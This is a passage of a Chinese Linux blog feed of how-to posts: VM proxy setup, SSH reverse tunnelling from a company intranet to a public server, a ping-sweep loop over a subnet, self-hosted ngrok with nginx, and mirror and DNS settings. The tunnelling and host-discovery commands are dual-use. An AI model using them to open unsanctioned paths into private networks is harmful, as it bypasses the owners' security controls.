<h1 id="systemd-cgtop"><a href="#systemd-cgtop" class="headerlink" title="systemd-cgtop"></a>systemd-cgtop</h1>]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>Ubuntu设置系统代理网络上网</title>
    <url>/Linux/Ubuntu%E8%AE%BE%E7%BD%AE%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%90%86%E7%BD%91%E7%BB%9C%E4%B8%8A%E7%BD%91/</url>
    <content><![CDATA[<p>VMWare中的Ubuntu系统有时候需要发行代币之类的工作，这时候就需要科学上网，Linux下的VxN客户端软件都做的不太好，这时候可以通过设置Linux系统的“网络代理”来使用宿主机的网络来访问网络。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>宿主机：Win10（安装了VxN）<br>虚拟机：Ubuntu 18.04</p>
<h2 id="设置VMWare和虚拟机Ubuntu的网络"><a href="#设置VMWare和虚拟机Ubuntu的网络" class="headerlink" title="设置VMWare和虚拟机Ubuntu的网络"></a>设置VMWare和虚拟机Ubuntu的网络</h2><ol>
<li>VM虚拟机网络模式<ul>
<li><code>桥接模式</code> ，虚拟机和宿主机是同一个网段，我采用这个模式，宿主机IP是 <code>192.168.0.30</code> ；</li>
<li><code>Nat模式</code> ，在Win10的 <code>网络适配器</code> 或者 <code>ipconfig -all</code> 命令 找到 <code>VMware Network Adapter VMnet8</code> 的IP（这个是Nat网宿主机的IP），此模式下宿主机IP一般是 <code>192.168.x.1</code> 。</li>
</ul>
</li>
<li>打开Ubuntu网络设置<br><img src="/images/linux/设置网络代理1.png" alt></li>
<li>设置Ubuntu网络代理（设置为宿主机IP：192.168.0.30）<br><img src="/images/linux/设置网络代理2.png" alt><br>这里的IP指宿主机的IP，端口是指宿主机的VxN的端口，如宿主机上VxN的设置：<br><img src="/images/linux/VPN.png" alt><br>这样就设置完成了，重启一下Ubuntu的网络，用浏览器访问一下网络，如果还是不能访问，重启一下Ubuntu。</li>
</ol>
<h2 id="测试终端的网络"><a href="#测试终端的网络" class="headerlink" title="测试终端的网络"></a>测试终端的网络</h2><ol>
<li><p>用Ping测试是不行的，这跟Ping的协议有关。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@sam-ubuntu:~$ ping www.google.com</span><br><span class="line">PING www.google.com (205.186.152.122) 56(84) bytes of data.</span><br><span class="line">^C</span><br><span class="line">--- www.google.com ping statistics ---</span><br><span class="line">18 packets transmitted, 0 received, 100% packet loss, time 17403ms</span><br></pre></td></tr></table></figure>
</li>
<li><p>用wget来测试HTTP网络</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">samwen@sam-ubuntu:~$ wget www.google.com</span><br><span class="line">--2019-07-11 16:00:53--  http://www.google.com/</span><br><span class="line">Connecting to 192.168.0.30:1080... connected.</span><br><span class="line">Proxy request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [text/html]</span><br><span class="line">Saving to: ‘index.html’</span><br><span class="line"></span><br><span class="line">index.html              [ &lt;=&gt;                ]  12.40K  --.-KB/s    <span class="keyword">in</span> 0.002s  </span><br><span class="line"></span><br><span class="line">2019-07-11 16:00:54 (5.04 MB/s) - ‘index.html’ saved [12702]</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="局域网代理"><a href="#局域网代理" class="headerlink" title="局域网代理"></a>局域网代理</h2><p>我们已经实现了宿主机和虚拟机的网络代理，而我们的虚拟机由于使用了 <code>桥接模式</code>，那么它和局域网物理机是一样的，所以，局域网的物理机也可以按葫芦画瓢进行代理上网。</p>
<p>一台觉得PC机做代理资源比较浪费的话，可以在VM中刷OpenWRT固件，在OpenWRT中安装VxN也是可行的，网上有教程。如果手上有OpenWRT的路由器更好，就不需要在PC机上跑了。</p>
<p><a href="../../虚拟化技术&amp;云平台/VMware安装OpenWRT">【VMware安装OpenWRT】</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>Linux,ssr</tag>
      </tags>
  </entry>
  <entry>
    <title>利用SSH进行内网穿透</title>
    <url>/Linux/%E5%88%A9%E7%94%A8SSH%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h5 id="使用场景举例"><a href="#使用场景举例" class="headerlink" title="使用场景举例"></a>使用场景举例</h5><ol>
<li>在家里的电脑用 putty 登录到公司内网的测试服务器</li>
<li>将内网的测试服务（如 HTTP/Git/Svn，只要是基于 TCP 的就行）提供到公网</li>
</ol>
<blockquote>
<p>场景二 还可以通过路由器端口映射转发来实现，但是不是每个人都能控制公司的路由器，没有固定 IP 也是一个麻烦事。另外还可以通过 ngrok 等工具来转发，ngrok 还是有点慢，没有公网服务器时是一个不错的选择。</p>
</blockquote>
<h5 id="部署条件"><a href="#部署条件" class="headerlink" title="部署条件"></a>部署条件</h5><ol>
<li>有一台公网服务器，如阿里云的ESC。</li>
</ol>
<h5 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h5><ol>
<li>公网阿里云 ESC，系统 Ubuntu16.04（假设IP：6.6.6.6）</li>
<li>公司内网虚拟机，系统 Ubuntu16.04 服务器（假设IP：192.168.1.88）</li>
</ol>
<h5 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h5><ol>
<li><p>公司虚拟机运行命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 让ESC监听2323端口，并且将该端口的数据转发到本地的22端口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ssh -gfnNTR 6.6.6.6:2323:localhost:22 root@6.6.6.6 -o ServerAliveInterval=300</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在家里的putty连接 <code>6.6.6.6:2323</code></p>
</li>
<li><p>通过 ESC 的转发，连接到了公司的虚拟机。</p>
</li>
</ol>
<h5 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h5><ol>
<li><p>公司虚拟机运行 nginx 监听80端口。</p>
</li>
<li><p>公司虚拟机运行命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh -fNR 6868:localhost:80 root@6.6.6.6</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在家里的电脑访问 <code>http://6.6.6.6:6868</code></p>
</li>
<li><p>通过ESC的转发，可以访问到 nginx 的网页。</p>
</li>
</ol>
<p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/" target="_blank" rel="noopener">参考：实战 SSH 端口转发</a></p>
<p><a href="https://baijiahao.baidu.com/s?id=1587908068104260734&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">参考：内网穿透神器：SSH端口转发</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>打印Linux系统的Banner</title>
    <url>/Linux/%E6%89%93%E5%8D%B0Linux%E7%B3%BB%E7%BB%9F%E7%9A%84Banner/</url>
    <content><![CDATA[<p><img src="/images/linux/打印Linux系统的Banner1.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@bogon:~# screenfetch</span><br><span class="line">                          ./+o+-       root@bogon</span><br><span class="line">                  yyyyy- -yyyyyy+      OS: Ubuntu 16.04 xenial</span><br><span class="line">               ://+//////-yyyyyyo      Kernel: x86_64 Linux 4.4.0-97-generic</span><br><span class="line">           .++ .:/++++++/-.+sss/`      Uptime: 2d 9h 14m</span><br><span class="line">         .:++o:  /++++++++/:--:/-      Packages: 1004</span><br><span class="line">        o:+o+:++.`..```.-/oo+++++/     Shell: bash 4.3.48</span><br><span class="line">       .:+o:+o/.          `+sssoo+/    CPU: 2x Intel Core i7-7500U CPU @ 2.904GHz</span><br><span class="line">  .++/+:+oo+o:`             /sssooo.   RAM: 638MiB / 974MiB</span><br><span class="line"> /+++//+:`oo+o               /::--:.  </span><br><span class="line"> \+/+o+++`o++o               ++////.  </span><br><span class="line">  .++.o+++oo+:`             /dddhhh.  </span><br><span class="line">       .+.o+oo:.          `oddhhhh+   </span><br><span class="line">        \+.++o+o``-````.:ohdhhhhh+    </span><br><span class="line">         `:o+++ `ohhhhhhhhyo++os:     </span><br><span class="line">           .o:`.syhhhhhhh/.oo++o`     </span><br><span class="line">               /osyyyyyyo++ooo+++/    </span><br><span class="line">                   ````` +oo+++o\:    </span><br><span class="line">                          `oo++.      </span><br><span class="line">root@bogon:~#</span><br></pre></td></tr></table></figure>
<p><img src="/images/linux/打印Linux系统的Banner2.png" alt><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@bogon:~# linuxlogo</span><br><span class="line">        _,met$$$$$gg.                                                           </span><br><span class="line">     ,g$$$$$$$$$$$$$$$P.                                                        </span><br><span class="line">   ,g$$P&quot;&quot;       &quot;&quot;&quot;Y$$.&quot;.                                                      </span><br><span class="line">  ,$$P&apos;              `$$$.                                                      </span><br><span class="line">&apos;,$$P       ,ggs.     `$$b:                                                     </span><br><span class="line">`d$$&apos;     ,$P&quot;&apos;   .    $$$                               ,#.                    </span><br><span class="line"> $$P      d$&apos;     ,    $$P      ##:          :##        :###:                   </span><br><span class="line"> $$:      $$.   -    ,d$$&apos;      ##&apos;          `##         `#&apos;                    </span><br><span class="line"> $$;      Y$b._   _,d$P&apos;    __  ##     __     ##  __      _     __          _   </span><br><span class="line"> Y$$.    `.`&quot;Y$$$$P&quot;&apos;     ,####:##  ,######.  ##.#####. :### ,######. ###.####: </span><br><span class="line"> `$$b      &quot;-.__         ,##&apos; `###  ##:  :##  ###&apos; `###  ##&apos; #:   `## `###&apos; `##:</span><br><span class="line">  `Y$$b                  ##    `##  ##    ##  ##&apos;   `##  ##    ___,##  ##:   `##</span><br><span class="line">   `Y$$.                 ##     ##  #######:  ##     ##  ##  .#######  ##&apos;    ##</span><br><span class="line">     `$$b.               ##     ##  ##&apos;       ##     ##  ##  ##&apos;  `##  ##     ##</span><br><span class="line">       `Y$$b.            ##.   ,##  ##        ##    ,##  ##  ##    ##  ##     ##</span><br><span class="line">         `&quot;Y$b._         :#:._,###  ##:__,##  ##:__,##&apos; ,##. ##.__:##. ##     ##</span><br><span class="line">             `&quot;&quot;&quot;&quot;       `:#### ###  ######&apos;  `######&apos;  #### `#####&quot;## ##     ##</span><br><span class="line"></span><br><span class="line">Linux Version 4.4.0-97-generic, Compiled #120-Ubuntu SMP Tue Sep 19 17:28:18 UTC 2017</span><br><span class="line">        Two 2.9GHz Intel i7 Processors, 1.9GB RAM, 11616 Bogomips Total</span><br><span class="line">                                     bogon</span><br><span class="line"></span><br><span class="line">root@bogon:~#</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/linux/打印Linux系统的Banner3.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">             .-. </span><br><span class="line">       .-&apos;``(|||) </span><br><span class="line">    ,`\ \    `-`.                 88                         88 </span><br><span class="line">   /   \ &apos;``-.   `                88                         88 </span><br><span class="line"> .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 </span><br><span class="line">(:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 </span><br><span class="line"> `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 </span><br><span class="line">   \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 </span><br><span class="line">    `./ /    .-.`        &apos;88888&apos;  &apos;88888&apos;  &apos;88888&apos;  88   88  &apos;8888 &apos;88888&apos; </span><br><span class="line">       `-..-(   ) </span><br><span class="line">             `-`</span><br></pre></td></tr></table></figure>
<p><img src="/images/linux/打印Linux系统的Banner4.png" alt><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@bogon:~# linuxlogo -L 23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    .~~.   .~~.         ___                __                      ___  _ </span><br><span class="line">   &apos;. \ &apos; &apos; / .&apos;       / _ \___  ___ ___  / /  ___  ___ ___ _ __  / _ \(_)</span><br><span class="line">    .~ .~~~..~.       / , _/ _ `(_-&lt;/ _ \/ _ \/ -_) __/ __/ // / / ___/ / </span><br><span class="line">   : .~.&apos;~&apos;.~. :     /_/|_|\_,_/___/ .__/_.__/\__/_/ /_/  \_, / /_/  /_/  </span><br><span class="line">  ~ (   ) (   ) ~                 /_/                    /___/          </span><br><span class="line"> ( : &apos;~&apos;.~.&apos;~&apos; : )    </span><br><span class="line">  ~ .~ (   ) ~. ~     Linux Version 4.4.0-97-generic</span><br><span class="line">   (  : &apos;~&apos; :  )      Compiled #120-Ubuntu SMP Tue Sep 19 17:28:18 UTC 2017</span><br><span class="line">    &apos;~ .~~~. ~&apos;       Two 2.9GHz Intel i7 Processors, 1.9GB RAM</span><br><span class="line">        &apos;~&apos;           11616 Bogomips Total</span><br><span class="line">                      bogon</span><br></pre></td></tr></table></figure></p>
<p><a href="https://linux.cn/article-6510-1.html" target="_blank" rel="noopener">参考</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>扫描局域网机器脚本</title>
    <url>/Linux/%E6%89%AB%E6%8F%8F%E5%B1%80%E5%9F%9F%E7%BD%91%E6%9C%BA%E5%99%A8%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>linux 下用for循环 ping 网段：<code>10.0.1.*</code><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 10.0.1.&#123;1..254&#125;; <span class="keyword">do</span> <span class="keyword">if</span> ping -c 3 -w 3 <span class="variable">$i</span> &amp;&gt;/dev/null; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="variable">$i</span> Find the target; <span class="keyword">fi</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>自建ngrok服务内网穿透</title>
    <url>/Linux/%E8%87%AA%E5%BB%BAngrok%E6%9C%8D%E5%8A%A1%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    <content><![CDATA[<h5 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h5><ol>
<li>在<code>个人PC电脑</code>上调试 <code>微信公众号</code>，<code>微信web开发者工具</code> 需要公网域名。</li>
<li>ngrok将<code>个人PC电脑</code>的端口暴露到公网</li>
</ol>
<blockquote>
<p>本来用 <code>nginx反向代理</code> + <code>路由器的虚拟服务器转发</code> 可以很方便的解决这个场景，但最近公司路由器抽风，一直不好使。</p>
<p>官方的ngrok很不稳定，偶尔可以用。自建ngrok服务相对稳定，但要自己编译服务端和客户端的二进制文件。</p>
</blockquote>
<h5 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h5><p>公网访问 <a href="http://debug.mydomain.com" target="_blank" rel="noopener">http://debug.mydomain.com</a> 或者 <a href="https://debug.mydomain.com" target="_blank" rel="noopener">https://debug.mydomain.com</a> ，将直接访问到部署在我的PC电脑上的Tomcat服务，方便调试程序。</p>
<h5 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h5><ol>
<li>公网阿里云 ESC，系统 CentOS（假设域名：mydomain.com）</li>
<li>公司内的开发笔记本，系统 Win10</li>
</ol>
<p>我们将在服务器内编译二进制文件，下载到Win10运行。</p>
<h5 id="安装编译环境"><a href="#安装编译环境" class="headerlink" title="安装编译环境"></a>安装编译环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yum install -y perl-ExtUtils-MakeMaker mercurial golang</span></span><br></pre></td></tr></table></figure>
<p>如果是Ubuntu系统</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get install build-essential mercurial golang</span></span><br></pre></td></tr></table></figure>
<h5 id="下载ngrok源码"><a href="#下载ngrok源码" class="headerlink" title="下载ngrok源码"></a>下载ngrok源码</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /opt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/inconshreveable/ngrok.git ngrok</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ngrok</span></span><br></pre></td></tr></table></figure>
<h5 id="创建自签名证书"><a href="#创建自签名证书" class="headerlink" title="创建自签名证书"></a>创建自签名证书</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> NGROK_DOMAIN=<span class="string">"mydomain.com"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> openssl genrsa -out base.key 2048</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> openssl req -new -x509 -nodes -key base.key -days 10000 -subj <span class="string">"/CN=<span class="variable">$NGROK_DOMAIN</span>"</span> -out base.pem</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> openssl genrsa -out server.key 2048</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> openssl req -new -key server.key -subj <span class="string">"/CN=<span class="variable">$NGROK_DOMAIN</span>"</span> -out server.csr</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> openssl x509 -req -<span class="keyword">in</span> server.csr -CA base.pem -CAkey base.key -CAcreateserial -out server.crt -days 5000</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp server.crt assets/server/tls/snakeoil.crt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp server.key assets/server/tls/snakeoil.key</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp base.pem assets/client/tls/ngrokroot.crt</span></span><br></pre></td></tr></table></figure>
<h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 服务端 bin/ngrok</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make release-server</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> win64</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> GOOS=windows GOARCH=amd64 make release-client</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mac</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> GOOS=darwin GOARCH=amd64 make release-client</span></span><br></pre></td></tr></table></figure>
<h5 id="启动服务端"><a href="#启动服务端" class="headerlink" title="启动服务端"></a>启动服务端</h5><p>由于服务器环境中已有nginx存在，所以，这里的<code>ngrok</code>采用 <code>7070</code> 和 <code>7071</code> 端口。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> /opt/ngrok/bin/ngrokd -tlsKey=/opt/ngrok/server.key -tlsCrt=/opt/ngrok/server.crt -domain=mydomain.com -httpAddr=:7070 -httpsAddr=:7071 -tunnelAddr=:7443 &gt; /opt/ngrok/ngrok.log &amp;</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> netstat -tnlp</span></span><br><span class="line">tcp        0      0 0.0.0.0:7070        LISTEN      12816/ngrokd</span><br><span class="line">tcp        0      0 0.0.0.0:7071        LISTEN      12816/ngrokd</span><br><span class="line">tcp        0      0 0.0.0.0:7443        LISTEN      12816/ngrokd</span><br></pre></td></tr></table></figure>
<h5 id="配置阿里云控制台"><a href="#配置阿里云控制台" class="headerlink" title="配置阿里云控制台"></a>配置阿里云控制台</h5><ol>
<li><p>端口开放</p>
<p>在阿里云的 <code>安全组规则</code> 配置好 <code>入方向</code> 的端口 ，如将 <code>7070/8080</code> 范围对外开放。</p>
</li>
<li><p>域名解析</p>
<p><code>debug.mydomain.com</code> 指向我们的服务器IP地址 。</p>
</li>
</ol>
<h5 id="配置服务器nginx反向代理"><a href="#配置服务器nginx反向代理" class="headerlink" title="配置服务器nginx反向代理"></a>配置服务器nginx反向代理</h5><p>如果服务器没有其他服务，则可以跳过这一步，直接给ngrok用80端口。</p>
<blockquote>
<p><code>微信公众号开发</code> 必须采用80和443端口，反向代理是为了将 <code>debug.mydomain.com:80</code> 流量转发到 -&gt; ngrok-server(7070,7071)</p>
</blockquote>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">map</span> <span class="variable">$scheme</span> <span class="variable">$proxy_port</span> &#123;</span><br><span class="line">    "http"  "7070";</span><br><span class="line">    "https" "7071";</span><br><span class="line">    <span class="attribute">default</span> <span class="string">"7070"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>      <span class="number">80</span>;</span><br><span class="line">    <span class="comment">#listen      [::]:80;</span></span><br><span class="line">    <span class="attribute">listen</span>      <span class="number">443</span>;</span><br><span class="line">    <span class="comment">#listen      [::]:443;</span></span><br><span class="line">    <span class="attribute">server_name</span> <span class="literal">debug</span>.mydomain.com;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">resolver</span> <span class="number">114.114.114.114</span> valid=<span class="number">2s</span>;</span><br><span class="line">        <span class="attribute">proxy_pass</span>  <span class="variable">$scheme</span>://<span class="variable">$host</span>:<span class="variable">$proxy_port</span>;</span><br><span class="line">        <span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line">        <span class="attribute">client_max_body_size</span> <span class="number">10m</span>;   </span><br><span class="line">        <span class="attribute">client_body_buffer_size</span> <span class="number">128k</span>; </span><br><span class="line">        <span class="attribute">proxy_connect_timeout</span> <span class="number">90</span>; </span><br><span class="line">        <span class="attribute">proxy_read_timeout</span> <span class="number">90</span>;</span><br><span class="line">        <span class="attribute">proxy_buffer_size</span> <span class="number">4k</span>;       </span><br><span class="line">        <span class="attribute">proxy_buffers</span> <span class="number">6</span> <span class="number">128k</span>;        </span><br><span class="line">        <span class="attribute">proxy_busy_buffers_size</span> <span class="number">256k</span>;</span><br><span class="line">        <span class="attribute">proxy_temp_file_write_size</span> <span class="number">256k</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">ssl</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">ssl_certificate</span>  /opt/ngrok/server.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span>  /opt/ngrok/server.key;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">access_log</span> <span class="literal">off</span>;</span><br><span class="line">    <span class="attribute">log_not_found</span> <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h5><p>下载相关平台的客户端放在一目录下，如win64的 <code>ngrok.exe</code> 。同目录下新建文本 <code>ngrok.cfg</code>，内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server_addr: debug.mydomain.com:7443</span><br><span class="line">trust_host_root_certs: false</span><br></pre></td></tr></table></figure>
<p>假设我本地笔记本跑了一个Tomcat，端口为<code>8080</code> ，运行ngrok的命令如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ngrok.exe  -subdomain debug -proto=http -config=./ngrok.cfg 8080</span></span><br></pre></td></tr></table></figure>
<p>其中 <code>debug</code> 是我的子域名，在浏览器打开 <code>http://debug.mydomain.com</code> ，如果能访问 <code>Tomcat</code> 的页面，就OK了。</p>
<p>流量入流路由如： server-nginx -&gt; server-ngrok -&gt; client-ngrok -&gt; tomcat</p>
<blockquote>
<p>访问 <code>http://127.0.0.1:4040</code> (ngrok的页面)，可以看到所有来自外部的请求内容。</p>
</blockquote>
<h5 id="本地前-后端分离"><a href="#本地前-后端分离" class="headerlink" title="本地前/后端分离"></a>本地前/后端分离</h5><p>如果本地笔记本有多个服务，可以在本地再搭建一个 <code>nginx</code> ，通过反向代理转发实现流量转发。</p>
<p>比如：我架构是 <code>Vue + Tomcat</code> 实现了前后端分离，<code>Vue</code> 的端口为 <code>1234</code> ，<code>Tomcat</code> 端口依然为 <code>8080</code> ，<code>nginx</code> 端口为 <code>80</code> ，我们要将 <code>ngrok</code> 启动的端口改为 <code>nginx</code> 的 <code>80</code> 端口。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ngrok.exe  -subdomain debug -proto=http -config=./ngrok.cfg 80</span></span><br></pre></td></tr></table></figure>
<p>流量入流路由如： server-nginx -&gt; server-ngrok -&gt; client-ngrok -&gt; pc-nginx -&gt; (vue + tomcat)</p>
<p>本地PC <code>nginx</code> 配置文件中增加一个虚拟服务器，配置如下：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> localhost;</span><br><span class="line">    <span class="attribute">location</span> /wx &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:8080/wx/;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:1234;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>nginx</code> 将 <code>/wx</code> 路径的转发到 <code>Tomcat</code> ， <code>/wx</code> 以外的路径请求全部转发给 <code>Vue</code>。</p>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>后续只需要启动 ngrok-server 和 ngrok-client 就可以打通公网与PC机的网络。如果要开辟新的子域名，则需要添加新的域名记录。</p>
<blockquote>
<p>大量域名技巧: 编译基础域名设置为 <code>debug.mydomain.com</code> ，采用 <code>*.debug.mydomain.com</code> 作为 <code>server-nginx</code> 的name ，具体查看旧的commit记录。</p>
</blockquote>
<p><a href="http://www.racksam.com/2016/12/18/aliyun-centos7-install-ngrok/" target="_blank" rel="noopener">参考：阿里云主机CentOS 7下编译安装ngrok</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ngrok</tag>
      </tags>
  </entry>
  <entry>
    <title>腾讯开源软件镜像站上线</title>
    <url>/Linux/%E8%85%BE%E8%AE%AF%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E9%95%9C%E5%83%8F%E7%AB%99%E4%B8%8A%E7%BA%BF%20-%20%E5%89%AF%E6%9C%AC/</url>
    <content><![CDATA[<p>腾讯开源软件镜像站(Tencent Open Source Mirror Site)已于近日上线，其官方名称为「腾讯云软件源」，由腾讯云提供支持。</p>
<p>地址 &gt;&gt;&gt; <a href="https://mirrors.cloud.tencent.com/" target="_blank" rel="noopener">mirrors.cloud.tencent.com</a></p>
<p>官方表示搭建此开源镜像站的目的在于宣传自由软件的价值，提高自由软件社区文化氛围，推广自由软件在国内的应用。</p>
<p>腾讯开源软件镜像站提供了主流的 Linux 发行版下载，如 Ubuntu、Arch Linux、CentOS 和 Debian 等，以及常用的开源项目和 SDK 下载，如 Android SDK、Ceph、Flutter、Qt 和 Zabbix 等。</p>
<p><img src="/images/Linux/腾讯云软件源.png" alt="腾讯云软件源.png"></p>
<p>软件源同步频率为每天一次，同步的时间为凌晨0点-2点，部分常用的源Centos、Ubuntu、Debian、Debian-security等每天同步四次，同步时间为0点-18点。</p>
<p>文件列表项中的帮助链接为Linux发行版本软件的安装源的帮助，如果您有任何不懂可以点击获取相应的帮助。</p>
<p>若您使用腾讯云服务器，请将源的域名从 mirrors.cloud.tencent.com 改为 mirrors.tencentyun.com，使用内网流量不占用公网流量。</p>
<h3 id="使用腾讯云镜像源加速maven"><a href="#使用腾讯云镜像源加速maven" class="headerlink" title="使用腾讯云镜像源加速maven"></a>使用腾讯云镜像源加速maven</h3><p>打开maven的设置文件settings.xml，配置如下repository mirror：<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-tencentyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus tencentyun<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://mirrors.tencentyun.com/nexus/repository/maven-public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>腾讯,镜像站,开源软件</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云ECS的DNS设置</title>
    <url>/Linux/%E9%98%BF%E9%87%8C%E4%BA%91ECS%E7%9A%84DNS%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<p>将阿里云的ECS从Ubuntu16.04升级到18.04后，DNS失效。</p>
<p>解决办法如下：</p>
<h3 id="1-临时"><a href="#1-临时" class="headerlink" title="1.临时"></a>1.临时</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim /etc/resolv.conf</span><br><span class="line">nameserver 223.5.5.5</span><br><span class="line">nameserver 223.6.6.6</span><br></pre></td></tr></table></figure>
<p>重启失效。</p>
